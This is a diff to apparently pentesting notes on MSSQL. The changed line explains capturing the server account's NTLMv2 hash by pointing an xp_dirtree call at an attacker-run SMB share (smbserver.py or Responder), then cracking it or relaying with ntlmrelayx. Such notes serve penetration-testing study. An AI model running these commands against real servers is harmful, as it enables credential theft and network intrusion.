@@ -36,7 +36,7 @@ You can also try to get ntlmv2 hash for the user which is running the server. Th
 
 From your attacking machine: `smbserver.py -smb2support share .` (also "responder" tool will work)
 
-Inside mssqlclient.py session: `xp_dirtree \\<your_smbserver_ip>\whatever`
+Inside mssqlclient.py session: `xp_dirtree \\<your_smbserver_ip>\whatever`. You will get the NTLMv2 hash and try to crack.
 
 For NTLM relay look for "responder" and "ntlmrelayx" functionalitys.
 
